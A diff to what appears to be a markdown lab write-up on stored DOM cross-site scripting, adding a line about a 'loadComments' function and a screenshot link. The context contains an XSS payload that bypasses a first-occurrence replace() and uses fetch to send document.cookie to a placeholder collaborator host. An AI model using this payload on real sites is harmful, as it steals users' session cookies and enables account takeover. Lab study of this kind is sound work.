@@ -654,7 +654,9 @@ body:document.cookie
 
 ### Stored DOM XSS  
 
->In the JavaScript source code ***identify*** the ```replace()``` function, and testing payloads we see the function only replaces the first occurrence.  
+>In the JavaScript source code ***identify*** the ```replace()``` function inside the custom ```loadComments```, and testing payloads we see the function only replaces the first occurrence.  
+
+![stored dom-xss code replace](images/stored-dom-xss-code.png)  
 
 ```html
 <><img src=1 onerror=javascript:fetch(`https://COLLABORATOR.com?escape=`+document.cookie)>
